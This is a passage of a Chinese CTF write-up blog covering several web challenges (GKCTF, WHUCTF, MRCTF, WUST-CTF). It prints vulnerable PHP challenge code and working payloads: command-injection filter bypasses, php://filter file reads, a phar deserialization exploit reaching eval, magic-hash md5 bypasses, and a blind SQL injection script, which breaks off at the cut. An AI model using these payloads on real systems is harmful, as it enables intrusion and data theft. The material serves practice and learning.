</blockquote>
<h2 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/tac|rm|echo|cat|nl|less|more|tail|head/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"cat't read flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过payload：这些网上很多</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ip=<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="params">||</span>b=lag.php;a=f;ca\t$IFS$9$a$b</span><br></pre></td></tr></table></figure>

<p>查看源码得flag</p>
<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>本题由vulnhub靶机DC-5改编，几乎没变<br>在留言界面点击提交后跳转到<br><img src="/2020/05/29/GKCTF--WHUCTF/1590240050820.png" alt="1590240050820"></p>
<p>并且随着刷新，下面的年份也在随之变化，说明很有可能存在文件包含，但是不知道参数是什么，所以尝试爆破<br><img src="/2020/05/29/GKCTF--WHUCTF/1590240225372.png" alt="1590240225372"></p>
<p>参数file报错，尝试文件包含，成功</p>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590239828484.png" alt="1590239828484"></p>
<blockquote>
<p>php://filter/read=convert.base64-encode/resource=flag.php</p>
</blockquote>
<h2 id="Easy-unserialize"><a href="#Easy-unserialize" class="headerlink" title="Easy_unserialize"></a>Easy_unserialize</h2><p>本题为一个文件上传题，但是题目为反序列化，所以直接想到phar反序列化<br>但是无论怎样都找不到源码，所以卡了很久，看wp的时候说加一个<code>?acti0n</code>可以通过为协议读取源码，我一抓包才发现。下次做题要细心<br><img src="/2020/05/29/GKCTF--WHUCTF/1590658556213.png" alt="1590658556213"></p>
<p>接着便是读取源码：<code>php://filter/read/convert.Base64-encode/resource=upload.php</code>base被过滤，可以通过大小写绕过<br>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$dir = <span class="string">'upload/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>;</span><br><span class="line">	<span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line">		<span class="keyword">if</span>(!mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> error_get_last()[<span class="string">'message'</span>];</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Failed to make the directory'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	chdir($dir);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">		$name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">		$tmp_name = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">		$ans = exif_imagetype($tmp_name);</span><br><span class="line">		<span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt;= <span class="number">204800</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'filesize too big.'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!$name) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'filename can not be empty!'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(htaccess)|(user)|(\.\.)|(%)|(#)/i'</span>, $name) !== <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span><br><span class="line">			$type = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line">			<span class="keyword">if</span>($type == <span class="string">'image/gif'</span> <span class="keyword">or</span> $type == <span class="string">'image/jpg'</span> <span class="keyword">or</span> $type == <span class="string">'image/png'</span> <span class="keyword">or</span> $type == <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;Don't cheat me with Content-Type!&lt;/p&gt;"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">"&lt;p align=\"center\"&gt;You can't upload this kind of file!&lt;/p&gt;"</span>);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($tmp_name);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i'</span>, $content) !== <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">'&lt;script&gt;alert("You could not upload this image because of some dangerous code in your file!")&lt;/script&gt;'</span>);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;		</span><br><span class="line"></span><br><span class="line">		$extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i'</span>, $extension) === <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"&lt;p align=\"center\"&gt;You can't upload this kind of file!&lt;/p&gt;"</span>);</span><br><span class="line">		&#125; </span><br><span class="line">		$upload_file = $name;</span><br><span class="line">		move_uploaded_file($tmp_name, $upload_file);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(file_exists($name)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;Your file $name has been uploaded.&lt;br&gt;&lt;/p&gt;"</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("上传失败")&lt;/script&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;&lt;a href=\"view.php\" &gt;点我去看上传的文件&lt;/a&gt;&lt;/p&gt;"</span>;</span><br><span class="line">		<span class="comment">#header("refresh:3;url=index.php");</span></span><br><span class="line">	&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>view.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#include_once "flag.php"; </span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $dir;</span><br><span class="line">	<span class="keyword">private</span> $cmd;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;dir = <span class="string">'upload/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">'echo "&lt;div style=\"text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\"&gt;Powered by: xxx&lt;/div&gt;";'</span>;</span><br><span class="line">		<span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;dir)) &#123;</span><br><span class="line">			mkdir(<span class="keyword">$this</span>-&gt;dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_file_list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$file = scandir(<span class="string">'.'</span>);</span><br><span class="line">		<span class="keyword">return</span> $file;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">show_file_list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$file = <span class="keyword">$this</span>-&gt;get_file_list();</span><br><span class="line">		<span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt; sizeof($file); $i++) &#123; </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;["</span>.strval($i - <span class="number">1</span>).<span class="string">"]  $file[$i] &lt;/p&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">show_img</span><span class="params">($file_name)</span> </span>&#123;</span><br><span class="line">		$name = $file_name;</span><br><span class="line">		$width = getimagesize($name)[<span class="number">0</span>];</span><br><span class="line">		$height = getimagesize($name)[<span class="number">1</span>];</span><br><span class="line">		$times = $width / <span class="number">200</span>;</span><br><span class="line">		$width /= $times;</span><br><span class="line">		$height /= $times;</span><br><span class="line">		$template = <span class="string">"&lt;img style=\"clear: both;display: block;margin: auto;\" src=\"$this-&gt;dir$name\" alt=\"$file_name\" width = \"$width\" height = \"$height\"&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> $template;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">delete_img</span><span class="params">($file_name)</span> </span>&#123;</span><br><span class="line">		$name = $file_name;</span><br><span class="line">		<span class="keyword">if</span> (file_exists($name)) &#123;</span><br><span class="line">			@unlink($name);</span><br><span class="line">			<span class="keyword">if</span>(!file_exists($name)) &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;成功删除! 3s后跳转&lt;/p&gt;"</span>;</span><br><span class="line">				header(<span class="string">"refresh:3;url=view.php"</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"Can not delete!"</span>;</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;找不到这个文件! &lt;/p&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ins = <span class="keyword">new</span> View();</span><br><span class="line">chdir($ins-&gt;dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;当前目录为 "</span> . $ins-&gt;dir . <span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line">$ins-&gt;show_file_list();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'show'</span>])) &#123;</span><br><span class="line">	$file_name = $_POST[<span class="string">'show'</span>];</span><br><span class="line">	$ins-&gt;show_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'delete'</span>])) &#123;</span><br><span class="line">	$file_name = $_POST[<span class="string">'delete'</span>];</span><br><span class="line">	$ins-&gt;delete_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($ins);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在__destruct方法中看到eval，在<code>delete_img</code>方法里面发现<code>file_exists</code>，所以要利用delete进行POST传参<br>在upload.php里面可以看到过滤了文件内容，所以可以构造<code>show_source(&#39;flag.php&#39;);</code><br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $dir;</span><br><span class="line">        <span class="keyword">private</span> $cmd=<span class="string">"show_source('flag.php');"</span>;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">'1.png'</span>);</span><br><span class="line">    $phar -&gt; startBuffering();</span><br><span class="line">    $phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);   <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $phar -&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    $object = <span class="keyword">new</span> View();</span><br><span class="line">    $phar -&gt; setMetadata($object);  <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/29/GKCTF--WHUCTF/1590664033919.png" alt="1590664033919"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF和WUST-CTF部分题目复现</title>
    <url>/2020/03/30/MRCTF&amp;WUST-CTF/</url>
    <content><![CDATA[<p><strong>朴实无华</strong><br>知识点：intval ()绕过、md5绕过、命令执行绕过</p>
<p><strong>颜值成绩查询</strong><br>知识点：盲注</p>
<p><strong>ez_ bypass</strong><br>知识点：php代码审计</p>
<p><strong>PYwebsite</strong><br>知识点：修改xxf</p>
<p><strong>你传你鳓呢</strong><br>知识点：.htaccess文件上传</p>
<p><strong>套娃</strong><br>知识点：套娃</p>
<p><strong>Ezaudit</strong><br>知识点：PHP伪随机数</p>
<p><strong>ezpop</strong><br>知识点：pop链构造</p>
<a id="more"></a>

<h1 id="WUST-CTF"><a href="#WUST-CTF" class="headerlink" title="WUST-CTF"></a>WUST-CTF</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>签到题，前端修改输入作者得到一个博客，提示的是一个远古的博客，找到文章后发现后半段，前半段迟迟没找到，看文师傅博客说在博客主页。</p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>题目为一个登陆框，提示为此题无爆破。此地无银三百两。<br>抓包先爆破一遍万能密码，然后在响应头中发现了一个目录<br><img src="/2020/03/30/MRCTF&WUST-CTF/2.png" alt><br>访问一下，又是什么本地才能访问，抓包修改xxf，然后get，post传参，post传参是必须使用浏览器或者浏览器通过post传参后抓包再修改xxf，最后得到一个网址，拼接后访问便得到flag<br><img src="/2020/03/30/MRCTF&WUST-CTF/3.png" alt><br>就几种可能，一分钟不到就拼好了吧</p>
<h2 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h2><p>这个进去走正常流程，先注册后发现头像下面写着大大的上传，然后上传抓包好像修改后缀和文件类型就绕过了。拿到shell后使用终端到根目录下发现了flag和readflag，访问flag没有权限，以为要提权。后面发现readflag为一个可执行文件，直接 <code>./readflag</code>便得到了flag</p>
<h2 id="朴实无华"><a href="#朴实无华" class="headerlink" title="朴实无华"></a>朴实无华</h2><p>进入题目显示<code>hack me</code>,直接扫目录发现了<code>fl4g.php</code><br><img src="/2020/03/30/MRCTF&WUST-CTF/4.png" alt><br>进去后就让我们依次绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>level1<br>intval ()— 获取变量的整数值,这里网上说<code>intval(&#39;十六进制&#39;)会返回0，但是intval(&#39;16进制+1&#39;)，就会将16进制字符串强制转换为数型</code></p>
<p>但是在我实际的测试中发现<code>intval(&#39;16进制+1&#39;)</code>返回的结果任然为0。但是<code>intval(&#39;16进制&#39;+1)</code>会仍然当做十六进制在+1。我猜测应该是通过传参的方式，我们的传入的参数相当于用<code>&#39;&#39;</code>引起来了。然后又测试了一下，<code>var_dump(intval(0x2020));</code>不会返回0，而通过get传参的方式则会返回0.<br><img src="/2020/03/30/MRCTF&WUST-CTF/5.png" alt><br>level2<br>这个md5一般使用科学计数法绕过，也就是0e开头的，开始想的是找一个0e开头的md5加密后还是0e开头的就好了，然后搜索了一下双md5结果仍为0e开头字符串，但是TM的又绕不过<br>后面找到了一篇国外的文章<a href="https://www.whitehatsec.com/blog/magic-hashes/" target="_blank" rel="noopener">https://www.whitehatsec.com/blog/magic-hashes/</a><br>上面说到<code>当使用“ ==”运算符进行魔术哈希键入时，哈希类型为^ 0 + ed * $，在PHP中等于零。这意味着当密码哈希以“ 0e…”开头时，它将始终与以下字符串匹配，而不管这些字符串的实际含义是什么（如果所有后续字符都是“ 0-9”的数字）。这意味着这些魔术哈希数字被视为数字“ 0”，并与其他哈希进行比较，比较结果为true。</code>注意0e后面必须是数字。后面又在github上发现了生成这样的数的脚本<a href="https://github.com/bl4de/ctf/blob/master/2017/HackDatKiwi_CTF_2017/md5games1/md5games1.md" target="_blank" rel="noopener">https://github.com/bl4de/ctf/blob/master/2017/HackDatKiwi_CTF_2017/md5games1/md5games1.md</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import hashlib</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">'0e'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def breakit():</span><br><span class="line">    iters = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        s = prefix + str(iters)</span><br><span class="line">        hashed_s = hashlib.md5(s).hexdigest()</span><br><span class="line">        iters = iters + <span class="number">1</span></span><br><span class="line">        r = re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>, hashed_s)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;"</span>.format(s, hashed_s)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] in &#123;&#125; iterations"</span>.format(iters)</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] current value: &#123;&#125;       &#123;&#125; iterations, continue..."</span>.format(s, iters)</span><br><span class="line"></span><br><span class="line">breakit()</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[+] current value: <span class="number">0e196999999</span>       <span class="number">197000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e197999999</span>       <span class="number">198000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e198999999</span>       <span class="number">199000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e199999999</span>       <span class="number">200000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e200999999</span>       <span class="number">201000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e201999999</span>       <span class="number">202000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e202999999</span>       <span class="number">203000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e203999999</span>       <span class="number">204000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e204999999</span>       <span class="number">205000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e205999999</span>       <span class="number">206000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e206999999</span>       <span class="number">207000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e207999999</span>       <span class="number">208000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e208999999</span>       <span class="number">209000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e209999999</span>       <span class="number">210000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e210999999</span>       <span class="number">211000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e211999999</span>       <span class="number">212000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e212999999</span>       <span class="number">213000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e213999999</span>       <span class="number">214000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] current value: <span class="number">0e214999999</span>       <span class="number">215000000</span> iterations, <span class="keyword">continue</span>...</span><br><span class="line">[+] found! md5( <span class="number">0e215962017</span> ) ---&gt; <span class="number">0e291242476940776845150308577824</span></span><br><span class="line">[+] in <span class="number">215962018</span> iterations</span><br><span class="line">bl4de:~/hacking/ctf/<span class="number">2017</span>/HackDatKiwi_CTF_2017 $</span><br></pre></td></tr></table></figure>

<p>所以通过0e215962017便可以绕过<br>level3<br>这个还挺简单的，过滤了cat，可以用more代替，过滤了空格就用<code>$IFS$9</code>等绕过<br>总的payload</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">fl4g.php?num=<span class="number">0x2022</span>&amp;md5=<span class="number">0e215962017</span>&amp;get_flag=more$IFS$<span class="number">9f</span>llllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/MRCTF&WUST-CTF/6.png" alt></p>
<h2 id="颜值成绩查询"><a href="#颜值成绩查询" class="headerlink" title="颜值成绩查询"></a>颜值成绩查询</h2><p>进去后为程序查询，估计是sql注入，先抓包fuzz一下。<br>并没有弄出个什么名堂，过滤了空格，手动测试后发现存在盲注</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>length(database())&gt;<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>然后写一个盲注脚本就可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://101.200.53.102:10114/?stunum=1"</span></span><br><span class="line">normallen=len(requests.get(url).text)</span><br><span class="line">print(normallen)</span><br><span class="line">database=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range (<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload=<span class="string">"/**/and/**/ascii(substr(database(),"</span>+str(i)+<span class="string">",1))="</span>+str(j)</span><br><span class="line">        payload2=<span class="string">"/**/and/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'/**/limit/**/0,1),"</span>+str(i)+<span class="string">",1))="</span>+str(j)</span><br><span class="line">        payload3=<span class="string">"/**/and/**/ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name='flag'/**/limit/**/1,1),"</span>+str(i)+<span class="string">",1))="</span>+str(j)</span><br><span class="line">        payload4=<span class="string">"/**/and/**/ascii(substr((select/**/value/**/from/**/flag),"</span>+str(i)+<span class="string">",1))="</span>+str(j)</span><br><span class="line">        Url=url+payload4</span><br><span class="line">        <span class="comment">#print(Url)</span></span><br><span class="line">        finallen=len(requests.get(Url).text)</span><br><span class="line">        <span 